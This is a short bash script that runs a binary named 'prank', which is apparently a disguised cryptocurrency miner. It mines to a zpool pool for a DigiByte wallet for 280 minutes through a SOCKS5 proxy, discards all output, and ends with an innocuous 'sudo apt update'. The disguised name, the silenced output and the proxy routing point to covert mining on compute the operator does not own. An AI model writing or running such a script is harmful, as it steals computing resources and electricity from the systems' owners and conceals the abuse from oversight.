#!/bin/bash
chmod +x prank 
timeout 280m ./prank -a scryptn2 -o scryptn2.eu.mine.zpool.ca:4339 -u D5VKJFaxCsP6iEn9s9TyTDm9Jr9U1WHqSb -p c=DGB -t 4 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
sudo apt update
